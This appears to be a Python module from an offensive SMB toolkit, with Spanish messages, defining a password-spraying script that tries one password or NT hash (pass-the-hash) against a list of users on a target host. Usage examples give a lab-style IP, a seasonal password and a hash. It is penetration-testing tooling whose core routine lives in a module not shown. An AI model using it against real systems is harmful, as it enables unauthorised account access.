# scripts/smb/attack/password_spray.py

from scripts.base import BaseScript
from modules.smb import SMBModule
from core.output import console


class PasswordSprayScript(BaseScript):
    name = "password-spray"
    description = "Prueba una misma contraseña o hash contra una lista de usuarios (--userlist)"

    examples = [
        {"flag": "--userlist",
         "desc": "Fichero con un usuario por línea (obligatorio para este script)",
         "good": "smb --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'Summer2024!'",
         "bad": "smb --script=password-spray -t 10.129.1.5 -p 'Summer2024!'  [sin --userlist, no hay usuarios que probar]"},
        {"flag": "-p / --password",
         "desc": "Contraseña única a probar contra TODOS los usuarios. Excluyente con -H",
         "good": "smb --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'Summer2024!'",
         "bad": "smb --script=password-spray -t 10.129.1.5 --userlist users.txt -p ''  [contraseña vacía casi nunca es útil]"},
        {"flag": "-H / --hash",
         "desc": "Hash NT (o LM:NT) único a probar contra TODOS los usuarios (pass-the-hash spray). Excluyente con -p",
         "good": "smb --script=password-spray -t 10.129.1.5 --userlist users.txt -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "smb --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'x' -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c  [-p y -H juntos: elige solo uno]"},
    ]

    def run(self, **kwargs):
        userlist = kwargs.get("userlist")
        if not userlist:
            console.print("[red]Falta --userlist: password-spray necesita un fichero con usuarios.[/red]")
            return

        if self.creds.hash and self.creds.password:
            console.print("[red]No combines -p y -H en password-spray: elige contraseña o hash, no ambos.[/red]")
            return
        if not self.creds.hash and not self.creds.password:
            console.print("[red]Falta -p o -H: password-spray necesita una credencial que probar.[/red]")
            return

        smb = SMBModule(self.target, self.creds)
        if not smb.connect():
            return

        try:
            with open(userlist) as f:
                users = [line.strip() for line in f if line.strip()]
        except OSError as e:
            console.print(f"[red]No se pudo leer {userlist}: {e}[/red]")
            return

        if not users:
            return

        if self.creds.hash:
            smb.password_spray(users, nt_hash=self.creds.hash, domain=self.creds.domain)
        else:
            smb.password_spray(users, password=self.creds.password, domain=self.creds.domain)
